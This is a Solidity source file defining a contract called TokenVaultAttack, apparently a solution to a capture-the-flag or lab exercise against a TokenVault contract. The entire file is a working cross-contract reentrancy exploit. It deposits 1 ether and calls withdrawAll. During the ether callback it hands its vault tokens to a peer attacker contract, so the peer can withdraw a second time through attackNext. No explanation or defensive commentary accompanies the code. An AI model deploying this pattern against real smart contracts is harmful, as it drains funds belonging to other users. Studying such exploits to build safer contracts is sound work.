// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {TokenVault} from "./TokenVault.sol";
import {VaultToken} from "./VaultToken.sol";

contract TokenVaultAttack {

  TokenVault public target;
  VaultToken public token;
  TokenVaultAttack peer;

  constructor(TokenVault _target, VaultToken _token) {
    target = _target;
    token = _token;
  }

  function setPeer(TokenVaultAttack _peer) public {
    peer = _peer;
  }

  receive() external payable {
    if (address(target).balance >= 1 ether) {
      token.transfer(address(peer), token.balanceOf(address(this)));
    }
  }

  function attack() external payable {
    if (msg.value < 1 ether) {
      revert("Insufficient amount");
    }
    target.deposit{value: 1 ether}();
    target.withdrawAll();
  }

  function attackNext() external {
    target.withdrawAll();
  }
}


